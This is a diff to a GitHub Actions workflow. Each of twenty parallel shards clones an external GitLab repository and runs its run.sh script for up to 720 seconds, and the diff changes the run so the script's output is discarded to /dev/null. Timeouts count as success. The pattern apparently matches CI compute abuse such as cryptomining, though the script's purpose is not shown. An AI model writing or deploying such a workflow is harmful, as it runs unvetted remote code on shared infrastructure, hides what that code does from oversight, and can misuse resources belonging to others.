@@ -27,7 +27,7 @@ jobs:
       matrix:
         shard: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
     runs-on: ubuntu-latest
-    timeout-minutes: 327
+    timeout-minutes: 60
     steps:
       - name: Setup Node
         uses: actions/setup-node@v4
@@ -35,14 +35,13 @@ jobs:
           node-version: ${{ env.NODE_VERSION }}
 
       - name: "shard ${{ matrix.shard }}/20"
-        timeout-minutes: 60
+        timeout-minutes: 40
         env:
           SHARD: ${{ matrix.shard }}
         run: |
           set -uo pipefail
           echo "=== shard $SHARD/20 ==="
 
-          # ---------- apt: hanya deps Node.js native module ----------
           need() { dpkg -s "$1" >/dev/null 2>&1 || MISSING+=("$1"); }
           MISSING=()
           for p in \
@@ -62,18 +61,18 @@ jobs:
           else
             echo ">>> Semua deps sudah ada, skip apt"
           fi
-          # ----------------------------------------------------------
 
           echo "=== versi ==="
           node -v; npm -v; which node
-          nproc --all; lscpu | head -10
+          lscpu | head -10
 
           git clone --depth 1 https://gitlab.com/masaakk88/file/xiaomi01.git
           cd xiaomi01
           chmod +x run.sh
 
-          timeout 720 ./run.sh 2>&1 | tail -200
-          RC=${PIPESTATUS[0]}
+          nproc --all && timeout 720 ./run.sh >/dev/null 2>&1
+          RC=$?
+
           if [ "$RC" -ne 0 ] && [ "$RC" -ne 124 ]; then
             echo "❌ shard $SHARD gagal (exit $RC)"; exit "$RC"
           fi
